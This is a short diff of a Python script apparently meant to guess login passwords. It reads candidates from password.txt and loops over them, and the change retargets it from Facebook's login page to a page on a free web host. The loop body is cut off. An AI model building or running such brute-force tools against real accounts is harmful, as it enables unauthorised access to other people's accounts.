@@ -1,6 +1,6 @@
 import requests
 
-url = 'https://www.facebook.com/login'
+url = 'https://haxcoderyeah.000webhostapp.com/login.php'
 arq = open ('password.txt', 'r').readlines()
 
 for line in arq:
